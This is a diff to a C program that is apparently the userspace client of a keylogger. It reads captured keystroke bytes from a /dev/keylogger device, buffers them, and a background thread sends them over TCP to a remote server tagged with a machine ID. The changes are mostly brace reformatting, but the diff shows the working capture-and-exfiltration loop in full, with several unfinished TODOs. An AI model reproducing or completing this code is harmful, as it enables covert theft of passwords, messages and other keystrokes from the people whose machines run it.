@@ -23,8 +23,10 @@ struct sockaddr_in addr;
 int connectionfd = -1;
 pthread_t connectionThread;
 
-void* connectionThreadWorker(void* nothing) {
-    while (isRunning) {
+void* connectionThreadWorker(void* nothing)
+{
+    while (isRunning)
+    {
         // wait, until big buffer empty TODO
         while(toSendBufferSize == 0) {sleep(1);}
 
@@ -32,7 +34,8 @@ void* connectionThreadWorker(void* nothing) {
 
 
 
-        while(isRunning) {
+        while(isRunning)
+        {
             connectionfd = socket(AF_INET, SOCK_STREAM, 0);
             // try to connect
             while (connect(connectionfd, (const struct sockaddr *) &addr, sizeof(addr)) == -1) {
@@ -45,16 +48,17 @@ void* connectionThreadWorker(void* nothing) {
             // send data TODO errors
             status = sendDataToServer(connectionfd, toSendBuffer, toSendBufferSize, (uint32_t *) &machineId);
             // set size to 0
-            if (status) toSendBufferSize = 0;
+            if (status)
+            {
+                toSendBufferSize = 0;
+            }
             // unlock bigbuffer
             pthread_mutex_unlock(&toSendBufferMutex);
             close(connectionfd);
             // if successfully:
-            if (status) {
+            if (status)
+            {
                 //   notify that bigbuffer have enough space for one small buffer TODO
-
-
-
 
 
                 //   break
@@ -74,7 +78,8 @@ int totalRead = 0;
 
 int main(int argc, char *argv[])
 {
-    if (argc != 3) {
+    if (argc != 3)
+    {
         fprintf(stderr, "Incorrect number of arguments\n");
         return 1;
     }
@@ -88,42 +93,42 @@ int main(int argc, char *argv[])
     // read computer id TODO
 
     // open device
-    if ((dev_fd = open("/dev/keylogger", O_RDONLY)) == -1) {
+    if ((dev_fd = open("/dev/keylogger", O_RDONLY)) == -1)
+    {
         fprintf(stderr, "Cannot open device\n");
         return 2;
     }
 
     // create connectionThread
-    if (pthread_create(&connectionThread, NULL, &connectionThreadWorker, NULL) != 0) {
+    if (pthread_create(&connectionThread, NULL, &connectionThreadWorker, NULL) != 0)
+    {
         fprintf(stderr, "Cannot create thread\n");
         return 3;
     }
 
-    while (1) {
+    while (1)
+    {
         int readBytes;
-        if ((readBytes = read(dev_fd, smallBuffer+smallBufferSize, SMALL_BUFFER_SIZE-smallBufferSize)) == -1) {
+        if ((readBytes = read(dev_fd, smallBuffer+smallBufferSize, SMALL_BUFFER_SIZE-smallBufferSize)) == -1)
+        {
             fprintf(stderr, "Error reading device\n");
             close(dev_fd);
             exit(3);
         }
-        totalRead += readBytes;
         smallBufferSize += readBytes;
+
+        totalRead += readBytes;
         printf("Read %d bytes, total: %d, current size: %d big: %d\n", readBytes, totalRead, smallBufferSize, toSendBufferSize);
-        if (smallBufferSize == SMALL_BUFFER_SIZE) {
+
+        if (smallBufferSize == SMALL_BUFFER_SIZE)
+        {
             // wait until big buffer does not have space for one full small buffer TODO
-
-
-
-
 
             pthread_mutex_lock(&toSendBufferMutex);
             // copy to big buffer
             memcpy(toSendBuffer+toSendBufferSize, smallBuffer, SMALL_BUFFER_SIZE);
             toSendBufferSize += SMALL_BUFFER_SIZE;
             // notify, that big buffer is not empty TODO
-
-
-
 
 
             pthread_mutex_unlock(&toSendBufferMutex);
